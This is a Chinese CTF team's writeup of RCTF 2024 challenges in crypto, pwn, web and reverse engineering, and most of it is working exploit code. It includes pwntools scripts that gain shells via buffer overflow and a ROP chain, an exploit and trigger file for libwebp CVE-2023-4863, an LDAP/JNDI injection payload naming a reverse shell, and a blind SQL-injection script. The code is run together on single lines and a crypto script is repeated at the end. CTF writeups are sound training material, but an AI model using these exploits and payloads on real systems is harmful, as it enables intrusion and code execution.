# RCTF 2024 Writeup  –Polaris战队

> 原文: https://www.ctfiot.com/184335.html
> ID: 184335

本次 RCTF 2023，我们星盟ctf战队排名第11。

排名

11

星盟ctf战队

6798.95

12

SAINTSEC

5883.86

13

Er0s1on

5616

14

V&N

5262.4

15

Hor1Zzon

5041

16

Syclover

5041

17

0RAYS

4944

18

ukfc

4635

19

Scr1w

4267.15

20

S1uM4i

4129.85

_

Crypto

SignSystem

exp.py

from random import choicesfrom hashlib import sha1from Crypto.Util.number import *import stringfrom pwn import *from sage.all import *from tqdm import *import gmpy2import time
table = string.ascii_lowercase
host = '121.37.182.7'                  #ip地址port =  10089                              #端口
sh = remote(host,port)                  #建立连接  sh.recvuntil(b"your pubKey:")
pub = eval(sh.recvline().decode().strip())
p,q,g,y = pub
R = []S = []H = []for i in range(19):    sh.recvuntil(b">")    sh.sendline(b"1")    sh.recvuntil(b"Which message to sign?: ")    m = "".join(choices(table,k=16))    msg = m.encode()    h = bytes_to_long(sha1(msg).digest())    sh.sendline(msg)    sh.recvuntil(b"Signature:")    data1 = eval(sh.recvline().decode().strip())    r,s = data1    S.append(s)    R.append(r)    H.append(h)

n = len(S)r0 = R[0]s0 = S[0]h0 = H[0]
def sign(pubkey, x, msg, k):    p, q, g, y = pubkey    r = pow(g, k, p) % q    Hm = int(sha1(msg).hexdigest(), 16)    s = (Hm + x * r) * inverse(k, q) % q    return (r, s)
for high in trange(256):    for low in range(4):        lowbit = low.bit_length()        A = []        B = []        tt = 2**lowbit        for i in range(1,len(R)):            a = tt*R[i]*s0 * gmpy2.invert(tt*r0*S[i],q) % q            b = (r0*H[i] - R[i]*h0 + R[i]*s0*(high*2**152+low) - r0*S[i]*(high*2**152+low)) * gmpy2.invert(tt*r0*S[i],q) % q            A.append(a)            B.append(b)                n = len(A)        Ge = Matrix(ZZ,n+2,n+2)        for i in range(n):            Ge[i,i] = q            Ge[-2,i] = A[i]            Ge[-1,i] = B[i]                    K = 2**150        Ge[-2,-2] = 1        Ge[-1,-1] = K        for line in Ge.BKZ(block_size=30):            if abs(line[-1]) == K:                k0_unknown = line[-2]                k0 = high*2**152 + k0_unknown*tt + low                d = (k0 * s0 - h0) * gmpy2.invert(r0,q) % q                if pow(g,d,p) == y:                    print(1)                    sig = sign(pub,d,b"get flag",k0)                    r,s = sig                    sh.recvuntil(b">")                    sh.sendline(b"2")                    sh.recvuntil(b"Which message to verify?: ")                    sh.sendline(b"get flag")                    sh.sendlineafter(b"r:",str(r).encode())                    sh.sendlineafter(b"s:",str(s).encode())                    print(sh.recvline())
# RCTF{Ev3ry_fighter_h@s_their_signature_style}

Hello,XCTF!

task.py

from Crypto.Util.number import bytes_to_long as b2l, isPrime
p, hello = int(input("p = ")), input("hello = ")assert p.bit_length() == 100 and isPrime(p)assert b2l(f"{hello}$".encode()) % p == b2l(b"hello")assert len(hello) == 64 and all(x.upper() in "XCTF" for x in hello)print(f'Hello XCTFer! Take your spoils: {open("flag.txt", "r").read()}')

题目的意思相当于告诉我们hello是由X,C,T,F,x,c,t,f组成的长度为64的字符串，而且以$结尾，求解这个同余式

记明文为m，我们可以写成

接下来的想法就是构造格，用0,-1,1这样的小量，代替字符，变成一个背包问题

选取点X(88),f(102）,t(116)来求a,b使得

exp.sage

from Crypto.Util.number import *from tqdm import *from pwn import *
for _ in trange(100000):    p = getPrime(100)        c = bytes_to_long(b"hello")        lenth = 64    c = (c - 36) % p    for i in range(64):        c -= 102 * 256^(64-i)        c %= p        Ge = Matrix(ZZ,lenth+2,lenth+2)    T = 2**100    for i in range(lenth):        Ge[i,i] = 1        Ge[i,-1] = 14 * 256**(lenth - i)
    Ge[-2,-2] = 1    Ge[-2,-1] = -c    Ge[-1,-1] = p    Ge[:,-1:] *= T
    for line in Ge.BKZ(block_size=30):        tm = b""        if line[-1] == 0:            for i in line[:-2]:                if i == -1:                    tm += b"X"                if i == 0:                    tm += b"f"                if i == 1:                    tm += b"t"        if len(tm) == 64:            print(tm.decode())            print(p)            sh = remote("121.37.167.239",10089)            sh.sendlineafter(b"p = ",str(p).encode())            sh.sendlineafter(b"hello = ",tm)            print(sh.recvall())

PWN

五一国际劳动节

多线程菜单题

base::TaskRunner::PostTask启动任务，不同线程负责不同任务。

线程之间存在条件竞争。

这里主要用到两处条件竞争：

CheckMoney中存在 sleep 函数，配合rapids和Magic Castle的购买区别，rapids有sleep延时，Magic Castle没有延时，因此可以构造整数溢出，使得金钱变成一个很大的数值。

bool __fastcall Player::CheckMoney(Player *this, unsigned int a2){ ...  ptr = g_player.ptr; ...  v3 = ptr->money;  if ( v3 >= a2 )  {    v4 = std::__Cr::__put_character_sequence<char,std::__Cr::char_traits<char>>(           &std::__Cr::cout,           "x1B[31m [!] Deducting from your account, Please wait ... x1B[0m",           59LL); ...    sleep(1u); ...    v13->money = v12; ...}

void __fastcall MagicCastle::SwitchHandle(player **this){ ...  if ( (_DWORD)this != 3 )  {    if ( (_DWORD)this != 1337 )      return; ...            if ( g_player.ptr <= (player_inner *)((char *)&dword_0 + 1) )            {              if ( (unsigned __int8)base::internal::NeedsLazyInstance((unsigned __int64 *)&g_player) )              {                *(_OWORD *)&g_player.inner.field_0 = 0LL;                qword_145030 = 0LL;                v12 = &g_player.inner;                qword_145040 = 0LL;                byte_145048 = 0;                base::internal::CompleteLazyInstance(                  &g_player,                  (__int64)&g_player.inner,                  0LL,                  (void (__fastcall *)(void *))&g_player);              }              else              {                v12 = g_player.ptr;              }            }            Magic_Castle = v12->Magic_Castle; ...            v17[4] = MagicHeld::Gods;            v17[5] = 0LL;            v17[6] = Magic_Castle;            (**v11)(v11, v18, v17, 3000000LL);            return;          }          goto LABEL_41;        } ...

利用脚本

#!/usr/bin/env python3# -*- coding:utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
sh = remote('1.94.107.129', 10088)
sh.sendlineafter(b'name: n', b'/bin/sh')sh.sendlineafter(b'4. Quit.n>> ', b'1')sh.sendlineafter(b'>> ', b'3')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'1')sh.sendlineafter(b'>> ', b'1')
time.sleep(1.1)
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'3')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'2')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'1')sh.sendlineafter(b'>> ', b'2')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'3')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'2')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'1')sh.sendlineafter(b'>> ', b'3')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'3')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'1337')
sh.recvuntil(b'>> ')system_addr = int(sh.recvuntil(b'n'), 16)image_addr = int(sh.recvuntil(b'n'), 16)success('system_addr: ' + hex(system_addr))success('image_addr: ' + hex(image_addr))
sh.sendlineafter(b'realm!!!', b'3')
time.sleep(1.1)
sh.sendlineafter(b'4. Quit.n>> ', b'1')sh.sendlineafter(b'>> ', b'1')
time.sleep(0.1)
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'1337')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'2')
time.sleep(0.9)sh.sendlineafter(b'4. Quit.n>> ', b'3')
sh.sendlineafter(b'Comments: ', b'a' * 0x28 + p64(system_addr))
sh.interactive()

dwebp

CVE-2023-4863

复现参照：

# checkout webpgit clone https://chromium.googlesource.com/webm/libwebp/ webp_testcd webp_test/  # checkout vulnerable versiongit checkout 7ba44f80f3b94fc0138db159afea770ef06532a0  # enable AddressSanitizermake -f makefile.unixcd examples/  # fetch mistymntncop's proof-of-concept codewget https://raw.githubusercontent.com/mistymntncop/CVE-2023-4863/main/craft.c  # build and run proof-of-conceptgcc -o craft craft.c./craft bad.webp  # test trigger file./dwebp bad.webp -o test.png

#!/usr/bin/env python3# -*- coding:utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
def add(index, size, content):    sh.sendlineafter(b'5. Edit feedbackn> ', b'2')    sh.sendlineafter(b'> ', str(index).encode())    sh.sendlineafter(b'feedback?n', str(size).encode())    sh.sendlineafter(b'feedback:n', content)
def show(index):    sh.sendlineafter(b'5. Edit feedbackn> ', b'3')    sh.sendlineafter(b'> ', str(index).encode())
def delete(index):    sh.sendlineafter(b'5. Edit feedbackn> ', b'4')    sh.sendlineafter(b'> ', str(index).encode())
def edit(index, content):    sh.sendlineafter(b'5. Edit feedbackn> ', b'5')    sh.sendlineafter(b'> ', str(index).encode())    sh.sendlineafter(b'feedback:n', content)
sh = remote('123.60.91.255', 10088)
add(1, 0x43a0, b'aaaa')add(2, 0x20, b'bbbb')delete(2)add(2, 0x10, b'bbbb')delete(2)add(2, 0x20, b'bbbb')
delete(1)sh.sendlineafter(b'5. Edit feedbackn> ', b'1')sh.sendlineafter(b'base64:n', b'UklGRlYBAABXRUJQVlA4TEkBAAAvAAAAABoPwAAAANHc1gcAAAAAAAAAAAAAAAAAAAAAAAAAAACgqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq2bdt/7nseQNEWACS1rTHXBgAAAAAAAAAAAAAAAAAAAAAAAABAVVVVVVVVVVVVVVVVVVVVVVVVVVXVqqqqqqqqqqqqqqqqqqqqqqqqqqrOff97AEVbAJDUtsZcGwAAAAAAAAAAAAAAAAAAAAAAAAAAVVVVVVVVVVVVVVVVVVVVVVVVVVVVq6qqqqqqqqqqqqqqqqqqqqqqqqo69/3vARRtAUBS2xpzbQAAAAAAAAAAAAAAAAAAAAAAAAAAVFVVVVVVVVVVVVVVVVVVVVVVVVVVraqqqqqqqqqqqqqqqqqqqqqqqqrq3Pe/BwAAAMmJJKSqumeSAAAA7N79q6qqAgA= ')
add(1, 0x100, b'bbbb')add(1, 0x100, b'bbbb')show(1)
sh.recvuntil(b'bbbbn   ')libc_addr = u64(sh.recvn(8)) - 0x21ace0success('libc_addr:' + hex(libc_addr))
edit(2, b'c' * 0x30 + p64(libc_addr + 0x222200) + p64(8))show(1)sh.recvuntil(b'Feedback:n')stack_addr = u64(sh.recvn(8))success('stack_addr:' + hex(stack_addr))
edit(2, b'c' * 0x30 + p64(stack_addr - 0x1a0) + p64(0x100))
edit(1, flat([    libc_addr + 0x0000000000029139, #: ret;    libc_addr + 0x000000000002a3e5, #: pop rdi; ret;    libc_addr + 0x1d8678, # "/bin/sh"    libc_addr + 0x50d70, # system]))
sh.interactive()

Web

openYourEyesToSeeTheWorld

这题思路挺简单的，抽象的地方在出题人写的白名单waf。

题目核心就是一个ldap请求，可以连到任意的ldap服务器，任意传参执行search操作

@RestController  public class DemoController {      @RequestMapping(value={"/index"})      public String sayHello(@RequestBody Map<String, Object> bean) throws Exception {          //  Properties object is created to hold the LDAP configuration.          Properties properties = new Properties();          String ip = (String)bean.get("ip");          Integer port = (Integer)bean.get("port");          if (ip.matches("^[0-9.]+$")) {              String url = "ldap://" + ip + ":" + port;              properties.setProperty("java.naming.provider.url", url);              properties.setProperty("java.naming.factory.initial", "com.sun.jndi.ldap.LdapCtxFactory");              String searchBase = (String)bean.get("searchBase");              String filter = (String)bean.get("filter");              if (searchBase != null && filter != null) {                  new InitialDirContext(properties).search(searchBase, filter, null);              }          }          return "index";      }  }

问题出在search函数，searchBase参数可以触发到c_lookup，也就是JNDI

函数调用栈

c_lookup:1017, LdapCtx (com.sun.jndi.ldap)c_processJunction_nns:342, ComponentContext (com.sun.jndi.toolkit.ctx)c_search_nns:192, ComponentDirContext (com.sun.jndi.toolkit.ctx)p_search:388, ComponentDirContext (com.sun.jndi.toolkit.ctx)search:358, PartialCompositeDirContext (com.sun.jndi.toolkit.ctx)search:341, PartialCompositeDirContext (com.sun.jndi.toolkit.ctx)search:267, InitialDirContext (javax.naming.directory)sayHello:34, DemoController (com.example.demo.controller)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)doInvoke:205, InvocableHandlerMethod (org.springframework.web.method.support)invokeForRequest:150, InvocableHandlerMethod (org.springframework.web.method.support)invokeAndHandle:117, ServletInvocableHandlerMethod (org.springframework.web.servlet.mvc.method.annotation)invokeHandlerMethod:895, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)handleInternal:808, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)handle:87, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)doDispatch:1072, DispatcherServlet (org.springframework.web.servlet)doService:965, DispatcherServlet (org.springframework.web.servlet)processRequest:1006, FrameworkServlet (org.springframework.web.servlet)doPost:909, FrameworkServlet (org.springframework.web.servlet)service:555, HttpServlet (javax.servlet.http)service:883, FrameworkServlet (org.springframework.web.servlet)service:623, HttpServlet (javax.servlet.http)internalDoFilter:209, ApplicationFilterChain (org.apache.catalina.core)doFilter:153, ApplicationFilterChain (org.apache.catalina.core)doFilter:51, WsFilter (org.apache.tomcat.websocket.server)internalDoFilter:178, ApplicationFilterChain (org.apache.catalina.core)doFilter:153, ApplicationFilterChain (org.apache.catalina.core)doFilter:35, RequestWrapperFilter (com.example.demo.controller)internalDoFilter:178, ApplicationFilterChain (org.apache.catalina.core)doFilter:153, ApplicationFilterChain (org.apache.catalina.core)doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)doFilter:117, OncePerRequestFilter (org.springframework.web.filter)internalDoFilter:178, ApplicationFilterChain (org.apache.catalina.core)doFilter:153, ApplicationFilterChain (org.apache.catalina.core)doFilterInternal:93, FormContentFilter (org.springframework.web.filter)doFilter:117, OncePerRequestFilter (org.springframework.web.filter)internalDoFilter:178, ApplicationFilterChain (org.apache.catalina.core)doFilter:153, ApplicationFilterChain (org.apache.catalina.core)doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter)doFilter:117, OncePerRequestFilter (org.springframework.web.filter)internalDoFilter:178, ApplicationFilterChain (org.apache.catalina.core)doFilter:153, ApplicationFilterChain (org.apache.catalina.core)invoke:168, StandardWrapperValve (org.apache.catalina.core)invoke:90, StandardContextValve (org.apache.catalina.core)invoke:481, AuthenticatorBase (org.apache.catalina.authenticator)invoke:130, StandardHostValve (org.apache.catalina.core)invoke:93, ErrorReportValve (org.apache.catalina.valves)invoke:74, StandardEngineValve (org.apache.catalina.core)service:342, CoyoteAdapter (org.apache.catalina.connector)service:390, Http11Processor (org.apache.coyote.http11)process:63, AbstractProcessorLight (org.apache.coyote)process:928, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1794, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:52, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:748, Thread (java.lang)

{"ip":"xxx.xxx.xxx.xxx","port":1389,"searchBase":"JacksonReverseShellu002f","filter":"jasper"}

var6 = this.c_search(var5.getHead(), var2, var3, var4);

what_is_love

key1表的love_key列存了第一部分flag的值 且存在sql注入

key1=jasper’ || love_key REGEXP “^R”#

import requests  import string    # flag = "rctf{the_first_step_is_to_ge"  # flag = step_is_to_get_to_know  # strs = string.ascii_letters + string.digits + "-{}_"  strs = "abcdefghijklmnopqrstuvwxyz0123456789-{}_"  url = "http://1.94.13.174:10088/key1"      if __name__ == "__main__":      name = ''      for i in range(1,40):          char = ''          for j in strs:              # payload = "'||love_key REGEXP '^{}'#"              payload = "jasper'||love_key REGEXP '{}$'#"              # payload1=payload.format(name+j)              payload1 = payload.format(j+name)              data={"key1":payload1}              r = requests.post(url,data=data)              if "success" in r.text:                  name = j+name                  print(name)                  # print(j,end='')                  char = j                  break          if char =='#':              print(name)              break

可以看见have_lovers为true的时候才能获得flag 我们接着找这个属性在哪会被赋值

找到了

if (  userInfo.username === my_lover.username &&  userInfo.love_time === my_lover.love_time) {  have_lovers = true;}

class My_lover {  constructor() {    this.username = process.env.LOVER || "lover";    this.love_time = parseInt(process.env.LOVE_TIME, 10) || 30;  }}

username我们可以就用他默认的lover测试 因为题目名字也和Lover有关系 接下来就是看love_time

我们去搜索parseInt函数

如果传进去的参数是字符串（不带数字）该函数会返回NaN

这个很重要

Number 函数会尝试将其转换为数字。如果转换成功，无论原始值是整数、浮点数、科学记数法表示的数字还是某些字符串形式的数字，都会返回相应的数字。如果转换失败，它会返回 NaN

this.love_time = parseInt(process.env.LOVE_TIME, 10) || 30;

因为这段代码 我们猜测假如环境变量的值为非数字字符串，那love_time就是nan

那我们只要输入非数字字符串的love_time都会返回nan 从而结合username我们可以就用他默认的lover测试绕过 

于是我们本地伪造

Misc

五一国际劳动节

logo = """################################################################################################################################ # #########################################################################   ##       ########### ## ##          ###########                   ########             ##########   ##           #########               ##########                   ######                  #######   ########       ########     ##########################    #############    ############    ######   ###########     ######    ###########   ##############    ############    ######################    #############    #####    ###########    #############    ############    ######################    ##############   ####    #############   #############   #############    ######################    ##############    ###    #############    ############   ##############     ####################    ##############    ###   ###############   ############   ###############      ##################    ##############   ####   ###############   ############   #################      ################    #############    ####   ###############   ###########    ####################      #############    ############    #####   ###############   ###########    ######################     ############    ####           ######   ##############    ###########    ########################     ##########    ####         ########    #############    ###########    ##########################    #########    #########    #########   #############   ############    ##########################    #########    ##########    ########    ###########   #############    ##########################    #########    ###########    ########    #########    #############    #############    #########    #########    ############   #########     ######   ############       ###############     ####     ##########   ############## ###########         ############                  #########           ############# ###############################  ##############################################    ################################################################################################################""".strip()

Logo：2024

d="";i=0;c="#";k="#"*100while i<1175:d=d+int(f'{int("2csqv07nenmzp688vu2h9hs4iebn0zyy42m6kr0f7hvhtoq5l8gw562kyv7kx3g8njr9ilqgfjsjmisedy8ztiryeamwjwmf32xmxty9heqf0vca7sospweayrfra3wgfzt2vyi9ih0szfu10cf0de28cmeio733y8pco9snt8d91uru5bpslt3em5upwl5udj3fqz7h0wqubi9nfrsjwvlz50y6zf52uh70",36):b}'[i:i+5],2)*c;c=' 'if c=='#'else'#';i=i+5f=k+"n";i=0while i<2000:f=f+d[i:i+100]+'n';i=i+100f=f+k;logo=f[:157]+"#"+f[158:178]+"#"+f[179:2081]+"#"+f[2082:]

s1ayth3sp1re

unsigned char iArr[] = { 164, 158, 95, 107, 4, 215, 108, 115, 5, 8, 25, 57, 41, 236, 231, 17, 85 };  unsigned char iArr2[] = { 246, 221, 11, 45, 127, 148, 45, 36, 70, 73, 78, 8, 98, 141, 140, 112, 40 };  unsigned char res2[100];  res2[17] = 0;  for (int i = 0; i < 17; i++) {    res2[i]=(iArr[i] ^ iArr2[i]);  }//0x000000ffce4ff350 "RCTF{CAWCAW1Kaka}"

RE

五一国际劳动节

from pwn import *import timecontext.log_level="debug"#p=process("./2048")p=remote("1.94.104.104",10088)
p.recvuntil("exitn")p.sendline("1")p.recvuntil(": ")p.sendline("10000")
pad=["a","w","d","s"]
index=0while 1:    res=p.recvuntil("or r",timeout=1)    if len(res)==0:        break    p.sendline(pad[index%4])    index+=1
p.recvuntil("your current score: ")point=int(p.recvuntil("n")[:-1])p.sendline("1")p.recvuntil(": ")p.sendline(str(point))
index=0while 1:    res=p.recvuntil("or r",timeout=1)    if len(res)==0:        break    p.sendline(pad[index%4])    index+=1

for i in range(100):    index=0    while 1:        res=p.recvuntil("or r",timeout=1)        if len(res)==0:            break        p.sendline(pad[index%4])        index+=1    end=input()    if "fuck" in end:        break    p.recvuntil("your current score: ",timeout=1)    point=int(p.recvuntil("n",timeout=1)[:-1])    p.sendline("1")    p.recvuntil(": ")    p.sendline(str(point))p.interactive()

blocker_vm

import subprocessimport stringstring.printable from colorama import initinit(autoreset=True)printable = b"`abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[]^{|}~"
import frida, sysnumber = 23new_number = 0def is_right():    global new_number,number    if new_number > number:        number = new_number        return True    else:        return False         def on_message(message, data):    global new_number    print(message)    if message['type'] == 'send':        print("[*] {0}".format(message['payload']))        new_number = message['payload']        #print(message['payload'])        # val = int(message['payload'], 16)        # script.post({'type': 'input', 'payload': str(val * 2)})    elif message['type'] == "error":        print(message["description"])        print(message["stack"])        print(message["fileName"],"line:",message["lineNumber"],"colum:",message["columnNumber"])    else:        print(message)
jscode = open("test.js","rb").read().decode()import subprocess
flag = b"RCTF{a_baby_debug_blok"for index in range(len(flag),25):    # for i in range(32,128):    for i in range(len(printable)):        process = subprocess.Popen("bloker_vm.exe",                                stdin=subprocess.PIPE,                                stdout=subprocess.PIPE,                                stderr=subprocess.PIPE,bufsize=0                                )        tmp_flag = (flag+printable[i:i+1]).ljust(24,b"A")+b"}n"        print(tmp_flag)        print("try index:",index ,"chr :",i)        session = frida.attach("bloker_vm.exe")        script = session.create_script(jscode)        script.on('message', on_message)        print('[*] Start attach')        script.load()        process.stdin.write(tmp_flag)        output, error = process.communicate()        print(output)        if(is_right() == True):            flag  +=(printable[i:i+1])            print(flag)            break        process.terminate()

import subprocessimport stringstring.printable from colorama import initinit(autoreset=True)printable = b"`abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[]^{|}~"
import subprocess
flag = b"RCTF{a_baby_debug_blok"for index in range(len(flag),25):    # for i in range(32,128):    for i in range(len(printable)):        for j in range(len(printable)):
            process = subprocess.Popen("bloker_vm.exe",                                    stdin=subprocess.PIPE,                                    stdout=subprocess.PIPE,                                    stderr=subprocess.PIPE,bufsize=0                                    )            tmp_flag = (flag+printable[i:i+1]+printable[j:j+1]).ljust(24,b"A")+b"}n"            print(tmp_flag)            print("try index:",index ,"chr :",i)            process.stdin.write(tmp_flag)            output, error = process.communicate()            print(output)            if b"try" in output:                continue            else:                print("find ok!")                print(tmp_flag)                exit(0)            process.terminate()

PPTT

v23=0x6d61657971007000v24=0x5200007b75005473v25=0x00706a004674437dfor i1 in range(0x12,128):    v23=0x6d61657971007000+i1    v24=0x5200007b75005473    v25=0x00706a004674437d    if ((v23 - v24)&0xff) == (0x1AEFF6FDFC121BF1&0xff):        for i2 in range(0x12,128):            v23=0x6d61657971007000+i1            v24=0x5200007b75005473            v25=0x00706a004674437d            v23+=(i2<<16)            v24+=((i2-0x12)<<16)            v20 = v24 & v23            v19 = (v24 & v23 | v25 & v23) + 0x10086            v18 = (v25 & v23 ^ v25 & v24) - 0x114514            v17 = v24 & v23 ^ v25 & v23            if ((v23 - v24)&0xffffff) == (0x1AEFF6FDFC121BF1&0xffffff):                if ((v18 ^ (v19 - v20))&0xffffff) == (0x2100A0203EFBB8B&0xffffff):                    if  ((v17 ^ v19 ^ v20)&0xffffff) == (0x4083102108E&0xffffff):                        if ( ((v19 ^ v17) - v18)&0xffffff) == (0x1551566F3C6485ED&0xffffff):                            if ( (v18 ^ v19 ^ v25 & v24)&0xffffff) == ( 0x40836ECAB9A&0xffffff):                                for i3 in range(0x12,128):                                    v23=0x6d61657971007000+i1                                    v24=0x5200007b75005473                                    v25=0x00706a004674437d                                    v23+=(i2<<16)                                    v24+=((i2-0x12)<<16)                                    v25+=(i3<<32)                                    v20 = v24 & v23                                    v19 = (v24 & v23 | v25 & v23) + 0x10086                                    v18 = (v25 & v23 ^ v25 & v24) - 0x114514                                    v17 = v24 & v23 ^ v25 & v23
                                    if ((v23 - v24)&0xffffffffff) == (0x1AEFF6FDFC121BF1&0xffffffffff):                                        if ((v18 ^ (v19 - v20))&0xffffffffff) == (0x2100A0203EFBB8B&0xffffffffff):                                            if  ((v17 ^ v19 ^ v20)&0xffffffffff) == (0x4083102108E&0xffffffffff):                                                if ( ((v19 ^ v17) - v18)&0xffffffffff) == (0x1551566F3C6485ED&0xffffffffff):                                                    if ( (v18 ^ v19 ^ v25 & v24)&0xffffffffff) == ( 0x40836ECAB9A&0xffffffffff):                                                        for i4 in range(0x12,128):                                                            v23=0x6d61657971007000+i1                                                            v24=0x5200007b75005473                                                            v25=0x00706a004674437d                                                            v23+=(i2<<16)                                                            v24+=((i2-0x12)<<16)                                                            v25+=(i3<<32)                                                            v24+=(i4<<40)                                                            v20 = v24 & v23                                                            v19 = (v24 & v23 | v25 & v23) + 0x10086                                                            v18 = (v25 & v23 ^ v25 & v24) - 0x114514                                                            v17 = v24 & v23 ^ v25 & v23                                                            if ((v23 - v24)&0xffffffffffff) == (0x1AEFF6FDFC121BF1&0xffffffffffff):                                                                if ((v18 ^ (v19 - v20))&0xffffffffffff) == (0x2100A0203EFBB8B&0xffffffffffff):                                                                    if  ((v17 ^ v19 ^ v20)&0xffffffffffff) == (0x4083102108E&0xffffffffffff):                                                                        if ( ((v19 ^ v17) - v18)&0xffffffffffff) == (0x1551566F3C6485ED&0xffffffffffff):                                                                            if ( (v18 ^ v19 ^ v25 & v24)&0xffffffffffff) == ( 0x40836ECAB9A&0xffffffffffff):                                                                                                                                                                for i5 in range(0x12,128):                                                                                    v23=0x6d61657971007000+i1                                                                                    v24=0x5200007b75005473                                                                                    v25=0x00706a004674437d                                                                                    v23+=(i2<<16)                                                                                    v24+=((i2-0x12)<<16)                                                                                    v25+=(i3<<32)                                                                                    v24+=(i4<<40)                                                                                    v24+=(i5<<48)                                                                                    v20 = v24 & v23                                                                                    v19 = (v24 & v23 | v25 & v23) + 0x10086                                                                                    v18 = (v25 & v23 ^ v25 & v24) - 0x114514                                                                                    v17 = v24 & v23 ^ v25 & v23                                                                                    if ((v23 - v24)&0xffffffffffffff) == (0x1AEFF6FDFC121BF1&0xffffffffffffff):                                                                                        if ((v18 ^ (v19 - v20))&0xffffffffffffff) == (0x2100A0203EFBB8B&0xffffffffffffff):                                                                                            if  ((v17 ^ v19 ^ v20)&0xffffffffffffff) == (0x4083102108E&0xffffffffffffff):                                                                                                if ( ((v19 ^ v17) - v18)&0xffffffffffffff) == (0x1551566F3C6485ED&0xffffffffffffff):                                                                                                    if ( (v18 ^ v19 ^ v25 & v24)&0xffffffffffffff) == ( 0x40836ECAB9A&0xffffffffffffff):                                                                                                        for i6 in range(0x12,128):                                                                                                            v23=0x6d61657971007000+i1                                                                                                            v24=0x5200007b75005473                                                                                                            v25=0x00706a004674437d                                                                                                            v23+=(i2<<16)                                                                                                            v24+=((i2-0x12)<<16)                                                                                                            v25+=(i3<<32)                                                                                                            v24+=(i4<<40)                                                                                                            v24+=(i5<<48)                                                                                                            v25+=(i6<<56)                                                                                                            v20 = v24 & v23                                                                                                            v19 = (v24 & v23 | v25 & v23) + 0x10086                                                                                                            v18 = (v25 & v23 ^ v25 & v24) - 0x114514                                                                                                            v17 = v24 & v23 ^ v25 & v23                                                                                                                                                                                                                        if ((v23 - v24)&0xffffffffffffffff) == (0x1AEFF6FDFC121BF1&0xffffffffffffffff):                                                                                                                if ((v18 ^ (v19 - v20))&0xffffffffffffffff) == (0x2100A0203EFBB8B&0xffffffffffffffff):                                                                                                                    if  ((v17 ^ v19 ^ v20)&0xffffffffffffffff) == (0x4083102108E&0xffffffffffffffff):                                                                                                                        if ( ((v19 ^ v17) - v18)&0xffffffffffffffff) == (0x1551566F3C6485ED&0xffffffffffffffff):                                                                                                                            if ( (v18 ^ v19 ^ v25 & v24)&0xffffffffffffffff) == ( 0x40836ECAB9A&0xffffffffffffffff):                                                                                                                                print("byte1: "+chr(i1)+" "+hex(i1))                                                                                                                                print("byte2: "+chr(i2)+" "+hex(i2))                                                                                                                                print("byte3: "+chr(i2-0x12)+" "+hex(i2-0x12))                                                                                                                                print("byte4: "+chr(i3)+" "+hex(i3))                                                                                                                                print("byte5: "+chr(i4)+" "+hex(i4))                                                                                                                                print("byte6: "+chr(i5)+" "+hex(i5))                                                                                                                                print("byte7: "+chr(i6)+" "+hex(i6))
#RCTF{sj123emqsp4567tyua}#RCTF{sjknwemqspsdaqtyua}

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群1:222328705

星盟安全团队纳新群2:346014666

有兴趣的师傅欢迎一起来讨论!

PS:团队纳新简历投递邮箱：

xmcve@qq.com

责任编辑：@LYK0r4师傅


```
from random import choicesfrom hashlib import sha1from Crypto.Util.number import *import stringfrom pwn import *from sage.all import *from tqdm import *import gmpy2import time
table = string.ascii_lowercase
host = '121.37.182.7'                  #ip地址port =  10089                              #端口
sh = remote(host,port)                  #建立连接  sh.recvuntil(b"your pubKey:")
pub = eval(sh.recvline().decode().strip())
p,q,g,y = pub
R = []S = []H = []for i in range(19):    sh.recvuntil(b">")    sh.sendline(b"1")    sh.recvuntil(b"Which message to sign?: ")    m = "".join(choices(table,k=16))    msg = m.encode()    h = bytes_to_long(sha1(msg).digest())    sh.sendline(msg)    sh.recvuntil(b"Signature:")    data1 = eval(sh.recvline().decode().strip())    r,s = data1    S.append(s)    R.append(r)    H.append(h)

n = len(S)r0 = R[0]s0 = S[0]h0 = H[0]
def sign(pubkey, x, msg, k):    p, q, g, y = pubkey    r = pow(g, k, p) % q    Hm = int(sha1(msg).hexdigest(), 16)    s = (Hm + x * r) * inverse(k, q) % q    return (r, s)
